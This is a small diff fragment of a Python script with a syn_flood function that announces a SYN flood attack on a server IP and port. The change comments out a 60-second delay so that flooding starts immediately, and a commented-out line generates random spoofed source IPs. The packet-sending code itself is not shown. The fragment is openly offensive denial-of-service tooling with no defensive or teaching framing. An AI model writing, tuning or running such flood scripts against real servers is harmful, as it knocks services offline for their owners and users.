@@ -8,9 +8,9 @@ def syn_flood():
 
     print(f"[*] Starting SYN flood attack on {server_ip}:{server_port}...")
 
-    start_time = time.time()
-    while time.time() - start_time < 60:
-        pass
+    #start_time = time.time()
+    #while time.time() - start_time < 60:
+        #pass
     while True:
         # Generate a random source IP and port for spoofing
         #src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
